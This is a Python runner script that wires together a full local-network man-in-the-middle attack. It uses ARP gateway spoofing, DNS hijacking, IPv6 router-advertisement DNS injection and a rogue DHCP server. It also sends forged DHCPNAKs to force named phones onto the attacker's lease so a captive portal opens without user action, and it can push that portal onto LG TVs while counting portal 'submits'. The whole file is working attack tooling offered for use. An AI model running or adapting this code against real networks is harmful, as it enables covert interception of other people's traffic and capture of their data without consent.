"""
host_full_mitm.py — thin host-side runner that wires together the
production Aggressive Mode services.

What it does (each piece lives in the backend services tree now):

  *  ``ArpGatewayImpersonator``     (aggressive_mode.py)
  *  ``DnsHijacker``                (aggressive_mode.py)
  *  ``CaptivePortalServer``        (portal_server.py)
  *  optional ``launch_portal_background`` for any LG TV listed on CLI

Run elevated (Administrator + Npcap on Windows). Ctrl-C heals the LAN
and tears down all listeners.
"""

from __future__ import annotations

import argparse
import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

# Import production services
from app.services.aggressive_mode import (
    ArpGatewayImpersonator, DnsHijacker, Ipv6RaRdnssInjector,
)
from app.services.dhcp_attack import RogueDhcpServer, force_renew_phone
from app.services.dns_responder import get_dns_responder
from app.services.portal_server import get_portal_server
from app.services.tv_launcher import launch_portal_background
from scripts.host_hijack import detect_gateway, detect_link_local_v6


async def heal_arp(gw_mac: str, gw_ip: str, our_mac: str, iface: str) -> None:
    from scapy.all import ARP, Ether, sendp  # type: ignore[import-not-found]
    pkt = (
        Ether(src=gw_mac, dst="ff:ff:ff:ff:ff:ff")
        / ARP(op=2, hwsrc=gw_mac, psrc=gw_ip,
              hwdst="ff:ff:ff:ff:ff:ff", pdst=gw_ip)
    )
    for _ in range(5):
        sendp(pkt, iface=iface, verbose=False)
        await asyncio.sleep(0.2)


async def main(args: argparse.Namespace) -> None:
    our_ip, our_mac, gw_ip, gw_mac = detect_gateway()
    print(f"[+] us:      {our_ip}  ({our_mac})  iface={args.iface}")
    print(f"[+] gateway: {gw_ip}  ({gw_mac})")
    print(f"[+] upstream DNS: {args.upstream}")

    # Production services
    arp = ArpGatewayImpersonator(
        gateway_ip=gw_ip, gateway_real_mac=gw_mac,
        our_mac=our_mac, interface=args.iface,
    )
    dns = DnsHijacker(our_ip=our_ip, upstream=args.upstream)
    portal = get_portal_server(our_ip)
    responder = get_dns_responder(
        our_ip=our_ip, our_mac=our_mac, iface=args.iface, upstream=args.upstream,
    )

    await arp.start()
    await dns.start()
    await portal.start()
    await responder.start()

    # IPv6 RA RDNSS — phones with v6 (most modern handsets) start
    # using us as DNS within ~60s with no user action whatsoever.
    ll_v6 = detect_link_local_v6(args.iface)
    ra: Ipv6RaRdnssInjector | None = None
    if ll_v6:
        ra = Ipv6RaRdnssInjector(our_link_local_v6=ll_v6, interval_s=30.0)
        try:
            await ra.start()
            print(f"[+] ipv6 RA RDNSS broadcaster up (link-local {ll_v6})")
        except Exception as e:
            print(f"[!] ipv6 RA start failed: {e}")
            ra = None

    # RogueDHCP — sniff DHCPDISCOVER/REQUEST and race the real router
    # with an OFFER/ACK carrying RFC 8910 Captive Portal URL.  Phones
    # receiving the option auto-open their native captive popup.
    rdhcp = RogueDhcpServer(
        our_ip=our_ip, our_mac=our_mac,
        router_ip=gw_ip, router_mac=gw_mac, iface=args.iface,
    )
    try:
        await rdhcp.start()
        print(f"[+] rogue DHCP up (captive URL={rdhcp.captive_url})")
    except Exception as e:
        print(f"[!] rogue DHCP start failed: {e}")
        rdhcp = None

    print(f"[+] full mitm: arp+dns53+raw_dns+portal80"
          + (" +ipv6_ra" if ra else "")
          + (" +rogue_dhcp" if rdhcp else "") + " up")

    # Optional: nuke specific phones' DHCP leases at boot to force
    # immediate re-DHCP -> our rogue server wins -> captive popup fires
    # within seconds, no user action.
    for nuke in args.nuke:
        try:
            phone_ip, phone_mac = nuke.split("@")
        except ValueError:
            print(f"[!] bad --nuke arg {nuke!r}; want IP@MAC"); continue
        n = force_renew_phone(
            phone_ip=phone_ip, phone_mac=phone_mac,
            router_ip=gw_ip, router_mac=gw_mac,
            our_mac=our_mac, iface=args.iface,
        )
        print(f"[+] nuked DHCP lease on {phone_ip} ({phone_mac}) -- {n} DHCPNAKs sent")

    # Optional: auto-launch portal on listed LG TV(s)
    for tv in args.tv:
        try:
            tv_ip, tv_mac = tv.split("@")
        except ValueError:
            print(f"[!] bad --tv arg {tv!r}; want IP@MAC"); continue
        portal_url = f"http://{our_ip}/?bg=1"
        print(f"[+] launching portal on TV {tv_ip} ({tv_mac}) -> {portal_url}")
        r = await launch_portal_background(
            tv_ip=tv_ip, tv_mac=tv_mac, portal_url=portal_url,
        )
        print(f"    -> ok={r.ok} restored_to={r.restored_to} err={r.error or '-'}")

    try:
        while True:
            await asyncio.sleep(10)
            print(f"[stats] bound_dns(q={dns.queries} hj={dns.hijacked} fwd={dns.forwarded})  "
                  f"raw_dns(seen={responder.seen} hj={responder.hijacked} fwd={responder.forwarded})  "
                  f"portal(c={portal.ledger.claims} s={portal.ledger.submits})  "
                  f"raw_src={list(responder.sources.items())[:3]}")
    except asyncio.CancelledError:
        pass
    finally:
        await arp.stop()
        await dns.stop()
        await responder.stop()
        if ra is not None:
            await ra.stop()
        if rdhcp is not None:
            await rdhcp.stop()
        await portal.stop()
        await heal_arp(gw_mac, gw_ip, our_mac, args.iface)
        print(f"\n[final] bound_dns_q={dns.queries} raw_seen={responder.seen} "
              f"raw_hijacked={responder.hijacked} "
              f"ipv6_ra_sent={ra._sent if ra else 0} "
              f"dhcp_discovers={rdhcp.seen_discover if rdhcp else 0} "
              f"dhcp_won={rdhcp.races_won if rdhcp else 0} "
              f"portal_claims={portal.ledger.claims} submits={portal.ledger.submits}")


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--iface", default="Wi-Fi 2")
    p.add_argument("--upstream", default="1.1.1.1")
    p.add_argument("--tv", action="append", default=[],
                   help="auto-launch portal on TV(s), repeat as IP@MAC")
    p.add_argument("--nuke", action="append", default=[],
                   help="force a phone to re-DHCP at boot (sends DHCPNAK), repeat as IP@MAC")
    p.add_argument("--duration", type=int, default=0)
    args = p.parse_args()
    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        pass
